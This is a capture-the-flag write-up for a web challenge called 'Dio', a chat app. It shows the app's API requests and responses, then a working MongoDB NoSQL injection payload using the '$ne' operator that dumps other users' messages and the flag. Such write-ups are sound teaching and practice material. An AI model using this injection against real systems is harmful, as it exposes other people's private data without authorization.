# Dio
**Category: Web**

This challenge is an application to chat with Dio. Write whatever you want and he responds:

<img width=50% src=images/app.png></img>

After playing with the app a bit, I could see there were two API endpoints being used under the hood:

## `/hey`
`hey` is used to retrieve messages. If you call it without a user ID parameter, it returns a user ID that gets saved into the browser's local storage:

**Request**
```json
POST /hey HTTP/1.1

{"userId":null}
```

**Response**
```json
{
    "userId": "ff37a073-ec9f-4fb0-a07a-382deddd5df5",
    "history": [
        {
            "userId": "ff37a073-ec9f-4fb0-a07a-382deddd5df5",
            "message": "It was Me, Dio !",
            "fromDio": true,
            "_id": "5fc9918c24a35c9c07d5e312"
        }
    ]
}
```

As soon as your userId gets saved to your browser, all future requests to the API include this userId in the request body.

When the application calls to `/hey` with your user ID (when the page is refreshed), it will return your message history.

**Request**
```json
POST /hey HTTP/1.1

{"userId":"ff37a073-ec9f-4fb0-a07a-382deddd5df5"}
```

**Response**
```json
{
    "userId": "ff37a073-ec9f-4fb0-a07a-382deddd5df5",
    "history": [
        {
            "_id": "5fc9919de14a041b60dfe59a",
            "userId": "ff37a073-ec9f-4fb0-a07a-382deddd5df5",
            "message": "Hello!",
            "fromDio": false
        },
        {
            "_id": "5fc9919ee14a046803dfe59b",
            "userId": "ff37a073-ec9f-4fb0-a07a-382deddd5df5",
            "message": "Muda! Muda! Muda! Muda! Muda!",
            "fromDio": true
        }
    ]
}
```

## `/messages`
`messages` is used to send messages to Dio. The response object contains his reply, which gets added to your chat view.

**Request**
```json
POST /message HTTP/1.1

{"userId":"ff37a073-ec9f-4fb0-a07a-382deddd5df5","message":"Hello!"}
````

**Reponse**
```json
{
    "reply": {
        "userId": "ff37a073-ec9f-4fb0-a07a-382deddd5df5",
        "message": "Muda! Muda! Muda! Muda! Muda!",
        "fromDio": true,
        "_id": "5fc9919ee14a046803dfe59b"
    }
}
```

## Creating the Attack
The `_id` field used in the API responses stuck out to me as a convention I've seen used in MongoDB. There may be a NoSQL injection vulnerability here. 

It is possible that the message history gets fetched by a method that looks like this:

```js
db.collection.find({
    "userId": userId // Normally userId would be something harmless like "ff37a073-ec9f-4fb0-a07a-382deddd5df5"
})
```

We could inject this with a query selector to find documents that don't belong to us. We can try hitting the endpoint with a query to find all messages with a userId _not equal_ to our ID:

**Request**
```json
POST /hey HTTP/1.1

{"userId":{ "$ne": "ff37a073-ec9f-4fb0-a07a-382deddd5df5"}}

```

**Response**
```json
{
    "userId": {
        "$ne": "ff37a073-ec9f-4fb0-a07a-382deddd5df5"
    },
    "history": [
        {
            "_id": "5fc8f9f9e14a04179adfe599",
            "userId": "j0hn474n-j03574r",
            "message": "H2G2{k0n0_d10_d4_!}",
            "fromDio": true
        } // Snipped out all the other messages to save space
    ]
}
```

Success, we were able to view all the other messages in the database, and most importantly, the flag message: `H2G2{k0n0_d10_d4_!}`
